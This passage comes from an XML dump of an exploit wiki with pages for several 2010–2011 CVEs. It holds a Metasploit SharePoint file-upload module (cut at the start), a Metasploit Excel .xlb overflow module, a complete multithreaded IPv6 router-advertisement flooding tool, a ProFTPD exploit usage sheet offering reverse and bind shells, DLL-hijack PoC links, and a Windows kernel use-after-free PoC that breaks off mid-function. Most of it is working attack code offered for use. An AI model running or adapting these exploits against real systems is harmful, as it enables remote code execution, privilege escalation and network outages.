        The module uses uses the Windows Management Instrumentation service to execute an
        arbitrary payload on vulnerable installations of SharePoint on Windows 2003 Servers.
        It has been successfully tested on Office SharePoint Server 2007 SP2 over Windows
        2003 SP2.
      },
      'Author'      =&gt; [
        'Oleksandr Mirosh', # Vulnerability Discovery and PoC
        'James Burton', # Vulnerability analysis published at "Entomology: A Case Study of Rare and Interesting Bugs"
        'juan' # Metasploit module
      ],
      'Platform'    =&gt; 'win',
      'References'  =&gt;
        [
          [ 'CVE', '2010-3964' ],
          [ 'OSVDB', '69817' ],
          [ 'BID', '45264' ],
          [ 'MSB', 'MS10-104' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-287/' ]
        ],
      'Targets'     =&gt;
        [
          [ 'Microsoft Office SharePoint Server 2007 SP2 / Microsoft Windows Server 2003 SP2', { } ],
        ],
      'DefaultTarget'  =&gt; 0,
      'Privileged'     =&gt; true,
      'DisclosureDate' =&gt; 'Dec 14 2010'
    )

    register_options(
      [
        Opt::RPORT(8082),
        OptInt.new('DEPTH', [true, "Levels to reach base directory",7])
      ], self.class)
  end

  # Msf::Exploit::Remote::HttpClient is avoided because send_request_cgi doesn't get
  # the response maybe due to the 100 (Continue) status response even when the Expect
  # header isn't included in the request.
  def upload_file(file_name, contents)

    traversal = "..\\" * datastore['DEPTH']

    soap_convert_file = "&lt;SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
    soap_convert_file &lt;&lt; "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" "
    soap_convert_file &lt;&lt; "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" "
    soap_convert_file &lt;&lt; "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" "
    soap_convert_file &lt;&lt; "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\" "
    soap_convert_file &lt;&lt; "SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;" &lt;&lt; "\x0d\x0a"
    soap_convert_file &lt;&lt; "&lt;SOAP-ENV:Body&gt;" &lt;&lt; "\x0d\x0a"
    soap_convert_file &lt;&lt; "&lt;i2:ConvertFile id=\"ref-1\" "
    soap_convert_file &lt;&lt; "xmlns:i2=\"http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface\"&gt;" &lt;&lt; "\x0d\x0a"
    soap_convert_file &lt;&lt; "&lt;launcherUri id=\"ref-3\"&gt;http://#{rhost}:8082/HtmlTrLauncher&lt;/launcherUri&gt;" &lt;&lt; "\x0d\x0a"
    soap_convert_file &lt;&lt; "&lt;appExe id=\"ref-4\"&gt;&lt;/appExe&gt;" &lt;&lt; "\x0d\x0a"
    soap_convert_file &lt;&lt; "&lt;convertFrom id=\"ref-5\"&gt;#{traversal}#{file_name}&lt;/convertFrom&gt;" &lt;&lt; "\x0d\x0a"
    soap_convert_file &lt;&lt; "&lt;convertTo id=\"ref-6\"&gt;html&lt;/convertTo&gt;" &lt;&lt; "\x0d\x0a"
    soap_convert_file &lt;&lt; "&lt;fileBits href=\"#ref-7\"/&gt;" &lt;&lt; "\x0d\x0a"
    soap_convert_file &lt;&lt; "&lt;taskName id=\"ref-8\"&gt;brochure_to_html&lt;/taskName&gt;" &lt;&lt; "\x0d\x0a"
    soap_convert_file &lt;&lt; "&lt;configInfo id=\"ref-9\"&gt;&lt;/configInfo&gt;" &lt;&lt; "\x0d\x0a"
    soap_convert_file &lt;&lt; "&lt;timeout&gt;20&lt;/timeout&gt;" &lt;&lt; "\x0d\x0a"
    soap_convert_file &lt;&lt; "&lt;fReturnFileBits&gt;true&lt;/fReturnFileBits&gt;" &lt;&lt; "\x0d\x0a"
    soap_convert_file &lt;&lt; "&lt;/i2:ConvertFile&gt;" &lt;&lt; "\x0d\x0a"
    soap_convert_file &lt;&lt; "&lt;SOAP-ENC:Array id=\"ref-7\" xsi:type=\"SOAP-ENC:base64\"&gt;#{Rex::Text.encode_base64(contents)}&lt;/SOAP-ENC:Array&gt;" &lt;&lt; "\x0d\x0a"
    soap_convert_file &lt;&lt; "&lt;/SOAP-ENV:Body&gt;" &lt;&lt; "\x0d\x0a"
    soap_convert_file &lt;&lt; "&lt;/SOAP-ENV:Envelope&gt;" &lt;&lt; "\x0d\x0a"

    http_request = "POST /HtmlTrLauncher HTTP/1.1" &lt;&lt; "\x0d\x0a"
    http_request &lt;&lt; "User-Agent: Mozilla/4.0+(compatible; MSIE 6.0; Windows 5.2.3790.131072; MS .NET Remoting; MS .NET CLR 2.0.50727.42 )" &lt;&lt; "\x0d\x0a"
    http_request &lt;&lt; "Content-Type: text/xml; charset=\"utf-8\"" &lt;&lt; "\x0d\x0a"
    http_request &lt;&lt; "SOAPAction: \"http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface#ConvertFile\"" &lt;&lt; "\x0d\x0a"
    http_request &lt;&lt; "Host: #{rhost}:#{rport}" &lt;&lt; "\x0d\x0a"
    http_request &lt;&lt; "Content-Length: #{soap_convert_file.length}" &lt;&lt; "\x0d\x0a"
    http_request &lt;&lt; "Connection: Keep-Alive" &lt;&lt; "\x0d\x0a\x0d\x0a"

    connect
    sock.put(http_request &lt;&lt; soap_convert_file)
    data = ""
    read_data = sock.get_once(-1, 1)
    while not read_data.nil?
      data &lt;&lt; read_data
      read_data = sock.get_once(-1, 1)
    end
    disconnect
    return data
  end

  # The check tries to create a test file in the root
  def check

    peer = "#{rhost}:#{rport}"
    filename = rand_text_alpha(rand(10)+5) + '.txt'
    contents = rand_text_alpha(rand(10)+5)

    print_status("#{peer} - Sending HTTP ConvertFile Request to upload the test file #{filename}")
    res = upload_file(filename, contents)

    if res and res =~ /200 OK/ and res =~ /ConvertFileResponse/ and res =~ /&lt;m_ce&gt;CE_OTHER&lt;\/m_ce&gt;/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit

    peer = "#{rhost}:#{rport}"

    # Setup the necessary files to do the wbemexec trick
    exe_name = rand_text_alpha(rand(10)+5) + '.exe'
    exe      = generate_payload_exe
    mof_name = rand_text_alpha(rand(10)+5) + '.mof'
    mof      = generate_mof(mof_name, exe_name)

    print_status("#{peer} - Sending HTTP ConvertFile Request to upload the exe payload #{exe_name}")
    res = upload_file("WINDOWS\\system32\\#{exe_name}", exe)
    if res and res =~ /200 OK/ and res =~ /ConvertFileResponse/ and res =~ /&lt;m_ce&gt;CE_OTHER&lt;\/m_ce&gt;/
      print_good("#{peer} - #{exe_name} uploaded successfully")
    else
      print_error("#{peer} - Failed to upload #{exe_name}")
      return
    end

    print_status("#{peer} - Sending HTTP ConvertFile Request to upload the mof file #{mof_name}")
    res = upload_file("WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
    if res and res =~ /200 OK/ and res =~ /ConvertFileResponse/ and res =~ /&lt;m_ce&gt;CE_OTHER&lt;\/m_ce&gt;/
      print_good("#{peer} - #{mof_name} uploaded successfully")
    else
      print_error("#{peer} - Failed to upload #{mof_name}")
      return
    end

  end

end
&lt;/pre&gt;</text>
      <sha1>9xfkme84g0rt7w7i9nyk69l1u8tqwz4</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2010-3971 Microsoft Internet Explorer 6 through 8 拒絕服務漏洞</title>
    <ns>0</ns>
    <id>709</id>
    <revision>
      <id>949</id>
      <timestamp>2021-04-03T05:59:59Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2010-3971.zip"</comment>
      <origin>949</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="monxwpyruurqjngdksyhiel6cs4ko6n" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2010-3971.zip</text>
      <sha1>monxwpyruurqjngdksyhiel6cs4ko6n</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2010-4221 ProFTPD before 1.3.3c任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>710</id>
    <revision>
      <id>950</id>
      <timestamp>2021-04-03T06:01:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; # cve-2010-4221 This exploit was written to study some concepts, enjoy!  ## Usage      Proftpd Telnet IAC remote generic exploit     Writen by: F0rb1dd3n      U..."</comment>
      <origin>950</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="846" sha1="89y7g29zz9jz1cld8w3qpeerf3itkaz" xml:space="preserve">==INFO==
&lt;pre&gt;
# cve-2010-4221
This exploit was written to study some concepts, enjoy!

## Usage

    Proftpd Telnet IAC remote generic exploit
    Writen by: F0rb1dd3n

    Usage: ./proftpd-exploit &lt;target IP&gt; &lt;target PORT&gt; &lt;attack type&gt;

    Attack Types:   0 - Socket Reuse
                    1 - Reverse Shell
                    2 - Bind Shell
                    3 - Your own shellcode (raw format)



Just type the target IP, PORT and the type of attack that you chose. The program will ask for another informations like: localhost, local port or remote bind port!

## Disclaimer

You don't need to set a listener for Reverse Shell, because the exploit will handle it for you. 
If you choose to use your own shellcode, you will need to set your listener!

&lt;/pre&gt;

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/cve-2010-4221.zip</text>
      <sha1>89y7g29zz9jz1cld8w3qpeerf3itkaz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2010-4258 Linux kernel before 2.6.36.2內存覆蓋漏洞</title>
    <ns>0</ns>
    <id>711</id>
    <revision>
      <id>951</id>
      <timestamp>2021-04-03T06:03:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2010-4258.zip"</comment>
      <origin>951</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="mn9l6kkmwdbr62qnsdy1tn8fjwjah7n" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2010-4258.zip</text>
      <sha1>mn9l6kkmwdbr62qnsdy1tn8fjwjah7n</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2010-4669 Microsoft Windows拒絕服務漏洞</title>
    <ns>0</ns>
    <id>712</id>
    <revision>
      <id>952</id>
      <timestamp>2021-04-03T06:06:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; # rauok This tool exploits CVE-2010-4669 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4669)      Be careful when testing, especially on older (read:..."</comment>
      <origin>952</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3390" sha1="szhwdntqblyhesv7abybxq4uxfhnzu5" xml:space="preserve">==INFO==
&lt;pre&gt;
# rauok
This tool exploits CVE-2010-4669 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4669)     
Be careful when testing, especially on older (read: coporate) networks. Very capable of permanently damaging servers / switches. 

# Usage
**usage:** ./main.py interface thread-count packet-count

# Dependancies
  -python2  
  -scapy  
  -root

&lt;/pre&gt;

==EXP==
&lt;pre&gt;
#! /usr/bin/python2
from scapy.all import * #required for packet crafting
import random	#generates mac, ipv6 address
import threading #for multithreading
import sys

try:
    print sys.argv[3] #check if all arguments have been supplied
except:
    print 'usage:',sys.argv[0],' interface thread-count packet-oount' #fail if not
    sys.exit(0)

class RA_Flooder (threading.Thread): #worker class for threading
    def __init__(self, counter=0):
		threading.Thread.__init__(self)
		self.iface = sys.argv[1]
		self.counter = counter 

    def prefix_pack(self): #build the actual packet
		self.pkt = ICMPv6NDOptPrefixInfo() 
		self.pkt.prefixlen = 64
		#self.pkt.prefix = "cc5f::"          #use for broadcast address instead of random prefix
		self.pkt.prefix = self.prefix_rand() #randomize prefix
		#self.pkt.show() #debug
		return self.pkt

    def ipv6_rand(self): #generate random ipv6 address
		self.rand = ':'.join('{:x}'.format(random.randint(0,2**16 - 1)) for i in range(4))
		return 'fe80::' + self.rand

    def prefix_rand(self): #generate random ipv6 prefix
		self.pre_rand = ':'.join('{:x}'.format(random.randint(0,2**16 - 1)) for i in range(2))
		return '2012:' + self.pre_rand + ':b304::'

    def mac_rand(self): #generate random mac address
		self.mac = ':'.join('{:x}'.format(random.randint(0,2**8 - 1)) for i in range(6))
		return str(self.mac)

    def packet_gen(self):
        #build the actual packet in scapy
        self.a = IPv6()	#set as an IPv6 packet
        self.a.dst = "ff02::1" #dst is set to broadcast
        self.a.src = self.ipv6_rand() #the source is randomized
        self.a.nh = 58

        self.b = ICMPv6ND_RA() #set as router advertisment
        self.b.routerlifetime = 0

        self.c = ICMPv6NDOptSrcLLAddr()
        self.c.lladdr = self.mac_rand()

        self.d = ICMPv6NDOptMTU()
    	self.e = ICMPv6NDOptPrefixInfo()
    	self.e.prefixlen = 64
        #self.e.prefix = self.prefix_rand()

        self.pk = self.a/self.b/self.c/self.d
        for i in range(44):
            self.pk = self.pk/self.prefix_pack()
        return self.pk

    def run(self):
        self.s = conf.L3socket(iface=self.iface) #use correct interface
        if self.counter is 0: #if the counter is zero, continue forever
            while True:
                self.pkt = self.packet_gen() #create a packet as fast as possible, sned it
                self.s.send(self.pkt)
        else: #otherwise, use until packet count (per thread) has been met
            for x in range(self.counter):
                self.pkt = self.packet_gen()
                self.s.send(self.pkt)
        print '[*] Finished sending'

threadLock = threading.Lock() 
threads = [] #store all threads
for x in range(0, int(sys.argv[2])): #create threads
    t = RA_Flooder(int(sys.argv[3])) #create thread with correct variables
    threads.append(t) #add thread to array
for t in threads:
    t.start() #start thread
    print '[+] Thread started ' + str(x) 
print 'All threads started'

&lt;/pre&gt;</text>
      <sha1>szhwdntqblyhesv7abybxq4uxfhnzu5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2010-4804 MicroStation 7.1權限提升漏洞</title>
    <ns>0</ns>
    <id>713</id>
    <revision>
      <id>953</id>
      <timestamp>2021-04-03T06:16:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; # CVE-2010-5230 Multiple untrusted search path vulnerabilities in MicroStation 7.1 allow local users to gain privileges via a Trojan horse (1) mptools.dll, (2)..."</comment>
      <origin>953</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1674" sha1="f24b58g2qxjrey6yr31v9w9an552ovo" xml:space="preserve">==INFO==
&lt;pre&gt;
# CVE-2010-5230
Multiple untrusted search path vulnerabilities in MicroStation 7.1 allow local users to gain privileges via a Trojan horse (1) mptools.dll, (2) baseman.dll, (3) wintab32.dll, or (4) wintab.dll file in the current working directory, as demonstrated by a directory that contains a .hln or .rdl file. NOTE: some of these details are obtained from third party information.

Hi folks,

After playing with windows DLL hijack toolkit,I got exploit POC for Pipe
design software Bentaly Microstation 7.1,Nero 8.2.8.0,Quicktime pictureviwer
7.6.5

 Bentley Microstation 7.1:

File :Ustation.exe  File type:hln  Hijack Dll:mptools.dll
File :Ustation.exe  File type:rdl   Hijack
Dll:baseman.dll,wintab32.dll,wintab.dll

Nero 8.2.8.0

File :nero.exe  File type:nab Hijack Dll:bcgpoleacc.dll

Quicktime pictureviwer 7.6.5

File :pictureviewer.exe   File type:mac,pct,pic,pict,pnt,pntg,qti,qtif
Hijack Dll:cfnetwork.dll
File :pictureviewer.exe   File type:pct,pic,pict,pnt,pntg,qti,qtif
Hijack Dll:corefoundation.dll

Download Link Generated POC's

https://paper.seebug.org/papers/old_sebug_paper/Exploits-Archives/2010-exploits/1008-exploits/Microstation_dllhijact_exploit.rar

https://paper.seebug.org/papers/old_sebug_paper/Exploits-Archives/2010-exploits/1008-exploits/Nero_dllhijack_exploit.rar

https://paper.seebug.org/papers/old_sebug_paper/Exploits-Archives/2010-exploits/1008-exploits/quicktime_pictureviwer_dllhijact_exploit.rar


For test cases-
http://reach2kalyan.blogspot.com/2010/08/playing-with-dll-hijack-bug.html


Kalyan
http://reach2kalyan.blogspot.com/

&lt;/pre&gt;

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2010-5230.zip</text>
      <sha1>f24b58g2qxjrey6yr31v9w9an552ovo</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2011-0105 MS11-021 Microsoft Office 2007 Excel .xlb緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>512</id>
    <revision>
      <id>715</id>
      <timestamp>2021-03-27T03:25:06Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # $Id: ms11_021_xlb_bof.rb 14172 2011-11-06 20:16:34Z sinn3r $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution a..."</comment>
      <origin>715</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4139" sha1="mkjt9mhzdyltm4lujw861nx77cb83pk" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# $Id: ms11_021_xlb_bof.rb 14172 2011-11-06 20:16:34Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote
 Rank = NormalRanking

 include Msf::Exploit::FILEFORMAT

 def initialize(info={})
  super(update_info(info,
   'Name'           =&gt; "MS11-021 Microsoft Office 2007 Excel .xlb Buffer Overflow",
   'Description'    =&gt; %q{
     This module exploits a vulnerability found in Excel of Microsoft Office 2007.
    By supplying a malformed .xlb file, an attacker can control the content (source)
    of a memcpy routine, and the number of bytes to copy, therefore causing a stack-
    based buffer overflow.  This results aribrary code execution under the context of
    user the user.
   },
   'License'        =&gt; MSF_LICENSE,
   'Version'        =&gt; "$Revision: 14172 $",
   'Author'         =&gt;
    [
     'Aniway',       #Initial discovery (via ZDI)
     'abysssec',     #RCA, poc
     'sinn3r',       #Metasploit
     'juan vazquez'  #Metasploit
    ],
   'References'     =&gt;
    [
     ['CVE', '2011-0105'],
     ['MSB', 'MS11-021'],
     ['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-121/'],
     ['URL', 'http://www.abysssec.com/blog/2011/11/02/microsoft-excel-2007-sp2-buffer-overwrite-vulnerability-ba-exploit-ms11-021/']
    ],
   'Payload'        =&gt;
    {
     'StackAdjustment' =&gt; -3500,
    },
   'DefaultOptions'  =&gt;
    {
     'ExitFunction'          =&gt; "process",
     'DisablePayloadHandler' =&gt; 'true',
     'InitialAutoRunScript'  =&gt; 'migrate -f'
    },
   'Platform'       =&gt; 'win',
   'Targets'        =&gt;
    [
     # Win XP SP3 (Vista and 7 will try to repair the file)
     ['Microsoft Office Excel 2007 on Windows XP',     {'Ret' =&gt; 0x3006A48D }], # JMP ESP in EXCEL (Office 2007)
     ['Microsoft Office Excel 2007 SP2 on Windows XP', {'Ret'=&gt;0x3006b185}],    #JMP ESP in excel
    ],
   'Privileged'     =&gt; false,
   'DisclosureDate' =&gt; "Aug 9 2011",
   'DefaultTarget'  =&gt; 0))

   register_options(
    [
     OptString.new('FILENAME', [true, 'The filename', 'msf.xlb'])
    ], self.class)
 end

 def exploit
  path = File.join(Msf::Config.install_root, 'data', 'exploits', 'CVE-2011-0105.xlb')
  f = File.open(path, 'rb')
  template = f.read
  f.close

  p = payload.encoded

  # Offset 1556
  record = ''
  record &lt;&lt; "\xa7\x00"                        #record type
  record &lt;&lt; "\x04\x00"                        #record length
  if target.name =~ /Excel 2007 SP2/ # Microsoft Office Excel 2007 SP2
   record &lt;&lt; "\xb0\x0d\x0c\x00"                #data
  else
   record &lt;&lt; "\xb0\x0f\x0c\x00"                #data
  end

  # Offset 1564
  continue_record = ''
  continue_record &lt;&lt; "\x3c\x00"               #record type
  continue_record &lt;&lt; [p.length+32].pack('v')  #length

  buf  = ''
  buf &lt;&lt; template[0, 1556]
  buf &lt;&lt; record
  buf &lt;&lt; continue_record
  buf &lt;&lt; rand_text_alpha(1)
  buf &lt;&lt; [target.ret].pack('V*')
  buf &lt;&lt; "\x00"*12
  buf &lt;&lt; p
  buf &lt;&lt; template[2336, template.length]

  file_create(buf)
 end
end

=begin
0:000&gt; r
eax=41414141 ebx=00000000 ecx=00000006 edx=008c1504 esi=0000007f edi=00000005
eip=301a263d esp=00137ef8 ebp=00137f6c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
EXCEL!Ordinal40+0x1a263d:
301a263d 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=????????
0:000&gt; dc esp
00137ef8  00000000 00000000 41414141 41414141  ........AAAAAAAA
00137f08  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00137f18  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00137f28  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00137f38  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00137f48  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00137f58  41414141 41414141 41414141 00000000  AAAAAAAAAAAA....
00137f68  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
=end
&lt;/pre&gt;</text>
      <sha1>mkjt9mhzdyltm4lujw861nx77cb83pk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2011-1237 Microsoft Windows權限提升漏洞</title>
    <ns>0</ns>
    <id>714</id>
    <revision>
      <id>954</id>
      <timestamp>2021-04-03T06:19:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; ## CVE-2011-1237  This is an old POC for CVE-2011-1237 on Windows 7 written in 2013. The vulnerability was discovered by Tarjei Mandt ([@kernelpool](https://twi..."</comment>
      <origin>954</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="14958" sha1="8eqn45yt42r4lxfa4mzh85uv0aohww1" xml:space="preserve">==INFO==
&lt;pre&gt;
## CVE-2011-1237

This is an old POC for CVE-2011-1237 on Windows 7 written in 2013. The
vulnerability was discovered by Tarjei Mandt ([@kernelpool](https://twitter.com/kernelpool))
and explain in his paper [Kernel Attacks through User-Mode Callbacks](https://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_WP.pdf).

Several things are hardcoded in this POC and it call the Null page which does
not work anymore. The exploit is describe in my talk
[A Look into the Windows Kernel](https://lse.epita.fr/lse-summer-week-2013/slides/lse-summer-week-2013-26-Bruno%20Pujos-A%20Look%20into%20the%20Windows%20Kernel.pdf).

The only thing the shellcode does is trigger a breakpoint.

&lt;/pre&gt;


==EXP==
&lt;pre&gt;
#include &lt;afxwin.h&gt;
#include &lt;iostream&gt;

// this should not be in hard, it's the addr of the handle table stored
// in win32k!gSharedInfo
#define BEGIN_HTABLE 0xbc510000

int c = 0;
HWND win;
HWND win2;
HWND win3;
HWND win4;
HWND destroy;

PVOID FakeWin;
PVOID FakeWin2;
wchar_t str[82];

NTSTATUS (NTAPI *NtAllocateVirtualMemory)
(
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PULONG AllocationSize,
    IN ULONG AllocationType,
    IN ULONG Protect
);

NTSTATUS (NTAPI *NtFreeVirtualMemory)
(
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG FreeType
);

// The hook needed for set the parent for the window (the one we will destroy
// later)
LRESULT CALLBACK CBT_exploit(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam)
{
    CBT_CREATEWND *info = (LPCBT_CREATEWND) lParam;

    if (nCode == HCBT_CREATEWND)
    {
        std::cout &lt;&lt; "Win parrent : " &lt;&lt; std::hex &lt;&lt; win2 &lt;&lt; std::endl;
        info-&gt;hwndInsertAfter = (HWND) win2;
    }

    return 0;
}

// The msg function which does the work for the msg and in there is the destroy
// and the realloc for the use-after-free
LRESULT CALLBACK WndProc (HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    if (msg == WM_NCCREATE)
    {
        // here we destroy the window we have pass as the parent
        if (!DestroyWindow(win2))
        {
            std::cout &lt;&lt; "PROBLEM : not destroy" &lt;&lt; std::endl;
            exit(0);
        }
        std::cout &lt;&lt; "The window have been destroy" &lt;&lt; std::endl;

        // we reallocate the size of the window
        if (!SetWindowTextW(win3, str))
        {
            std::cout &lt;&lt; "SetWindowTextW3 fail" &lt;&lt; std::endl;
            exit(0);
        }
        // In some case the first allocation with not be at the same
        // position than the window we just destroy so we do it twice
        if (!SetWindowTextW(win4, str))
        {
            std::cout &lt;&lt; "SetWindowTextW4 fail" &lt;&lt; std::endl;
            exit(0);
        }
        std::cout &lt;&lt; "The realloc have being done" &lt;&lt; std::endl;
    }
    // just returning the standard stuff for all the message
    return DefWindowProc (hwnd, msg, wParam, lParam);
}

int shellcode()
{
    // I should put a real shellcode here but that will do it for now
    __asm _emit 0xcc // int 3
    return 0;
    // everything after that fail because I don't fix the window...
}

void initShellcode()
{
    PVOID Addr = (PVOID) 0x00001000;
    ULONG Size = 1024;
    ULONG Status;
    char *nulll = 0;
    int  *nu = (int *) 1;

    Status = NtAllocateVirtualMemory( ((HANDLE) -1), &amp;Addr, 0, &amp;Size,
        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (Status)
    {
        std::cout &lt;&lt; "Allocation of the null page fail" &lt;&lt; std::endl;
        exit(0);
    }
    
    nulll[0] = 0xe8; // call
    nu[0] = ((int) shellcode) - 5; // relative addr
    nulll[5] = 0xc3; // ret
}

HINSTANCE init()
{
    HINSTANCE hInst = GetModuleHandle (0);
    WNDCLASSEX wc;

    // we get the address of the NtAllocateVirtualMemory
    *(FARPROC *) &amp;NtAllocateVirtualMemory = GetProcAddress(GetModuleHandle("NTDLL.DLL"),
        "NtAllocateVirtualMemory");
    *(FARPROC *) &amp;NtFreeVirtualMemory = GetProcAddress(GetModuleHandle("NTDLL.DLL"),
        "NtFreeVirtualMemory");

    // we register some window class
    // we need to register for set the WndProc function
    wc.cbSize = sizeof (WNDCLASSEX);
    wc.style = 0;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hInst;
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH) (COLOR_WINDOW+1);
    wc.lpszMenuName = NULL;
    wc.lpszClassName = "MyWinClass";
    wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

    if (!RegisterClassEx(&amp;wc))
    {
        std::cout &lt;&lt; "Window Registration Failed!" &lt;&lt; std::endl;
        exit(0);
    }

    initShellcode();

    return hInst;
}

// do the basic operation on the handler for knowing where it is in the table
int get_table_offset_from_handle(int h)
{
    return (0xc * (h &amp; 0xffff));
}

// If I can't allocate normally I just try to free something allocate at a place
// where I can alloc
PVOID desesperateallocate()
{
    int BaseAddr = 0x00200000; // this is arbitrary
    PVOID Addr = (PVOID) BaseAddr;
    ULONG Size = 0;
    ULONG Status;

    Status = NtFreeVirtualMemory( ((HANDLE) -1), &amp;Addr, &amp;Size,
        MEM_RELEASE);

    while (Status)
    {
        BaseAddr += 0x10000;
        Addr = (PVOID) BaseAddr;
        Status = NtFreeVirtualMemory( ((HANDLE) -1), &amp;Addr, &amp;Size,
            MEM_RELEASE);
    }

    std::cout &lt;&lt; "Free : 0x" &lt;&lt; std::hex &lt;&lt; Addr &lt;&lt; std::endl;

    Status = NtAllocateVirtualMemory( ((HANDLE) -1), &amp;Addr, 0, &amp;Size,
        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (Status)
    {
        std::cout &lt;&lt; "Fail reallocation at 0x" &lt;&lt; std::hex &lt;&lt; BaseAddr
            &lt;&lt; std::endl;
        exit(0);
    }
    return Addr;
}

// allocate with NTAllocatVirtualMemory a place for putting a fake window
// In particular this function care that the address will be put in a string
// SetWindowText convert the things it does not now how to print in '?'
PVOID functionallocate()
{
    int BaseAddr = 0x00200000; // this is arbitrary
    PVOID Addr = (PVOID) BaseAddr;
    ULONG Size = 1024;
    ULONG Status = 1;

    Status = NtAllocateVirtualMemory( ((HANDLE) -1), &amp;Addr, 0, &amp;Size,
        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    while (Status)
    {
        std::cout &lt;&lt; "Error Allocate : 0x" &lt;&lt; std::hex &lt;&lt; Addr &lt;&lt; " "&lt;&lt; Status
            &lt;&lt; std::endl;
        BaseAddr += 0x10000;
        Addr = (PVOID) BaseAddr;
        Status = NtAllocateVirtualMemory( ((HANDLE) -1), &amp;Addr, 0, &amp;Size,
        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        // If this have not work we will try to free something which is already
        // alloc this have a good chance to finish by crashing the program
        // but for now I have no problem with this
        if (((BaseAddr &gt;&gt; 16) &amp; 0xff) &gt; 0x7f)
        {
            std::cout &lt;&lt; "Fail to allocate a valid page" &lt;&lt; std::endl;
            std::cout &lt;&lt; "Begin desperate allocate" &lt;&lt; std::endl;
            return desesperateallocate();
        }
    }

